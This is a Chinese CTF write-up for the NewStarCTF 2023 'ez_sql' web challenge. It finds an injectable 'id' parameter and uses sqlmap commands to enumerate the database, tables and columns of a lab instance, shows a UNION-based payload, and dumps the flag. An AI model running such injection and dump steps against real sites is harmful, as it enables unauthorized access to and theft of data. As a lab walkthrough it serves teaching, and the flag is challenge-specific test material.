---
title: NewStarCTF 2023 ez_sql
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

先看题目描述 `inject me plz.` 我从来没听过这么清晰的要求，进入靶机网页

![](https://z1.ax1x.com/2023/10/12/piST7h8.png)

随便点一个进去，直接从 URL 中找到了注入点 `id`

```
http://d2479142-812f-459e-85c0-a713c73f2e26.node4.buuoj.cn:81/?id=TMP0919
```

## SqlMap 一条龙

### 查询数据库的名称

```
sqlmap -u http://d2479142-812f-459e-85c0-a713c73f2e26.node4.buuoj.cn:81/?id=TMP5512 --current-db
```

得到数据库名 `ctf`

```
[20:06:27] [INFO] resuming back-end DBMS 'mysql'
[20:06:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=TMP5512' UNION ALL SELECT CONCAT(CONCAT('qjjjq','lYwffGBbRblrhAwvvNSBHmvMxoaIKlBgjUVkWAne'),'qzqkq'),NULL,NULL,NULL,NULL-- aPEZ
---
[20:06:27] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty
back-end DBMS: MySQL 5 (MariaDB fork)
[20:06:27] [INFO] fetching current database
current database: 'ctf'
```

### 查询表名

如下命令中的两个 `ctf` 即刚刚查询出来的数据库名

```
sqlmap -u http://d2479142-812f-459e-85c0-a713c73f2e26.node4.buuoj.cn:81/?id=TMP5512 -D ctf -T ctf --tables
```

运行后得到表名 `here_is_flag`

```
[20:08:03] [INFO] fetching tables for database: 'ctf'
Database: ctf
[2 tables]
+--------------+
| grades       |
| here_is_flag |
+--------------+
```

### 查询字段名

如下命令中，`ctf` 为数据库名，`here_is_flag` 为表名

```
sqlmap -u http://d2479142-812f-459e-85c0-a713c73f2e26.node4.buuoj.cn:81/?id=TMP5512 -D ctf -T here_is_flag --columns
```

运行后得到字段名 `flag`

```
[20:08:38] [INFO] fetching columns for table 'here_is_flag' in database 'ctf'
Database: ctf
Table: here_is_flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
```

### 力挽狂澜

如下命令中，`ctf` 为数据库名，`here_is_flag` 为表名，两个 `flag` 为字段名

```
sqlmap -u http://d2479142-812f-459e-85c0-a713c73f2e26.node4.buuoj.cn:81/?id=TMP5512 -D ctf -T here_is_flag -C flag, flag --dump
```

最后得到如下内容

```
[20:12:33] [INFO] fetching entries of column(s) 'flag' for table 'here_is_flag' in database 'ctf'
Database: ctf
Table: here_is_flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{dc3253bd-170c-4bd3-8f5f-eb1ada6005d0} |
+--------------------------------------------+
```

Flag 就在脸上了，`flag{dc3253bd-170c-4bd3-8f5f-eb1ada6005d0}`